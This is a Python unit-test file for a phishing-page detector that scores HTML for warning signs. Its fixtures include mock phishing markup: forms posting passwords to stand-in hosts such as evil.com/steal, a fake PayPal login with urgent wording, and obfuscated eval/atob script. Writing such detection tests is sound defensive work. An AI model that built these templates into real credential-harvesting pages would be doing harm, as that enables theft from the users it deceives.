"""Unit tests for DOM signal extraction"""
import pytest
from app.analyzer.dom_signals import DOMAnalyzer


@pytest.fixture
def analyzer():
    """Create DOMAnalyzer instance"""
    return DOMAnalyzer()


def test_check_password_inputs_detected(analyzer):
    """Test detection of password input fields"""
    html = """
    <html>
        <form>
            <input type="text" name="username">
            <input type="password" name="password">
        </form>
    </html>
    """

    result = analyzer.analyze(html, "https://example.com")

    assert result.score > 0.0
    assert any("password input" in r.lower() for r in result.reasons)


def test_check_password_inputs_not_found(analyzer):
    """Test that pages without password fields are OK"""
    html = """
    <html>
        <form>
            <input type="text" name="search">
        </form>
    </html>
    """

    result = analyzer.analyze(html, "https://example.com")

    # Should not flag password inputs
    assert not any("password input" in r.lower() for r in result.reasons)


def test_check_external_forms(analyzer):
    """Test detection of forms submitting to external domains"""
    html = """
    <html>
        <form action="https://evil.com/steal">
            <input type="password">
        </form>
    </html>
    """

    result = analyzer.analyze(html, "https://example.com")

    assert result.score > 0.0
    assert any("external" in r.lower() and "form" in r.lower() for r in result.reasons)


def test_check_external_scripts(analyzer):
    """Test detection of external scripts"""
    html = """
    <html>
        <script src="https://example.com/local.js"></script>
        <script src="https://evil.com/malicious.js"></script>
        <script src="https://another-evil.com/bad.js"></script>
    </html>
    """

    result = analyzer.analyze(html, "https://example.com")

    assert result.score > 0.0
    assert any("external script" in r.lower() for r in result.reasons)


def test_check_iframes(analyzer):
    """Test detection of iframes"""
    html = """
    <html>
        <iframe src="https://example.com/frame"></iframe>
        <iframe src="https://another.com/frame"></iframe>
    </html>
    """

    result = analyzer.analyze(html, "https://example.com")

    assert result.score > 0.0
    assert any("iframe" in r.lower() for r in result.reasons)


def test_check_hidden_elements(analyzer):
    """Test detection of hidden elements"""
    html = """
    <html>
        <div>Visible 1</div>
        <div style="display:none">Hidden 1</div>
        <div style="visibility:hidden">Hidden 2</div>
        <div>Visible 2</div>
        <div style="display:none">Hidden 3</div>
        <div style="display:none">Hidden 4</div>
        <div style="display:none">Hidden 5</div>
    </html>
    """

    result = analyzer.analyze(html, "https://example.com")

    # With many hidden elements, should trigger warning
    assert any("hidden" in r.lower() for r in result.reasons)


def test_check_obfuscated_js(analyzer):
    """Test detection of obfuscated JavaScript"""
    test_cases = [
        ('<script>eval("malicious code")</script>', "eval"),
        ('<script>var x = unescape("%20")</script>', "unescape"),
        ('<script>var y = atob("base64")</script>', "atob"),
        ('<script>String.fromCharCode(72,69,76,76,79)</script>', "fromCharCode"),
    ]

    for html, pattern in test_cases:
        full_html = f"<html>{html}</html>"
        result = analyzer.analyze(full_html, "https://example.com")

        assert result.score > 0.0
        assert any("obfuscated" in r.lower() for r in result.reasons)


def test_check_brand_impersonation(analyzer):
    """Test detection of brand impersonation"""
    html = """
    <html>
        <head>
            <title>PayPal Login - Secure Payment</title>
            <meta name="description" content="Login to your PayPal account">
        </head>
    </html>
    """

    # Domain doesn't match PayPal
    result = analyzer.analyze(html, "https://fake-site.com")

    assert result.score > 0.0
    assert any("brand impersonation" in r.lower() for r in result.reasons)
    assert any("paypal" in r.lower() for r in result.reasons)


def test_check_brand_impersonation_legitimate(analyzer):
    """Test that legitimate brand sites are not flagged"""
    html = """
    <html>
        <head>
            <title>PayPal Login</title>
        </head>
    </html>
    """

    # Domain matches PayPal
    result = analyzer.analyze(html, "https://www.paypal.com")

    # Should not flag as impersonation
    assert not any("brand impersonation" in r.lower() for r in result.reasons)


def test_check_favicon_mismatch(analyzer):
    """Test detection of favicon from different domain"""
    html = """
    <html>
        <head>
            <link rel="icon" href="https://evil.com/favicon.ico">
        </head>
    </html>
    """

    result = analyzer.analyze(html, "https://example.com")

    assert result.score > 0.0
    assert any("favicon" in r.lower() for r in result.reasons)


def test_check_urgency_language(analyzer):
    """Test detection of urgency language"""
    html = """
    <html>
        <body>
            <h1>Act now! Your account will be suspended!</h1>
            <p>Click here to confirm your identity immediately.</p>
        </body>
    </html>
    """

    result = analyzer.analyze(html, "https://example.com")

    assert result.score > 0.0
    assert any("urgency" in r.lower() for r in result.reasons)


def test_check_data_uri_scripts(analyzer):
    """Test detection of data URI scripts"""
    html = """
    <html>
        <script src="data:text/javascript,alert('xss')"></script>
    </html>
    """

    result = analyzer.analyze(html, "https://example.com")

    assert result.score > 0.0
    assert any("data uri" in r.lower() for r in result.reasons)


def test_analyze_empty_html(analyzer):
    """Test analysis with empty HTML"""
    result = analyzer.analyze("", "https://example.com")

    assert result.score == 0.0
    assert "No HTML content" in result.reasons[0]


def test_analyze_none_html(analyzer):
    """Test analysis with None HTML"""
    result = analyzer.analyze(None, "https://example.com")

    assert result.score == 0.0
    assert "No HTML content" in result.reasons[0]


def test_full_phishing_page(analyzer):
    """Test analysis of a complete phishing page"""
    html = """
    <html>
        <head>
            <title>PayPal - Login to Your Account</title>
            <link rel="icon" href="https://paypal.com/favicon.ico">
        </head>
        <body>
            <h1>Urgent Security Alert!</h1>
            <p>Your account will be suspended! Verify immediately!</p>
            <form action="https://evil-collector.com/steal">
                <input type="text" name="email" placeholder="Email">
                <input type="password" name="password" placeholder="Password">
                <button>Login</button>
            </form>
            <iframe src="https://ads.com/tracker"></iframe>
            <script>eval(atob("bWFsaWNpb3Vz"))</script>
            <div style="display:none">Hidden tracking pixel</div>
        </body>
    </html>
    """

    result = analyzer.analyze(html, "https://fake-paypal.tk")

    # Should have high score due to multiple indicators
    assert result.score > 0.5
    assert len(result.reasons) > 3

    # Check for expected signals
    reason_text = " ".join(result.reasons).lower()
    assert "password" in reason_text or "form" in reason_text
    assert "urgency" in reason_text or "brand" in reason_text


def test_full_safe_page(analyzer):
    """Test analysis of a legitimate page"""
    html = """
    <html>
        <head>
            <title>Example Domain</title>
        </head>
        <body>
            <h1>Welcome to Example.com</h1>
            <p>This is a normal page with regular content.</p>
            <a href="/about">About Us</a>
        </body>
    </html>
    """

    result = analyzer.analyze(html, "https://example.com")

    # Should have low score
    assert result.score < 0.5
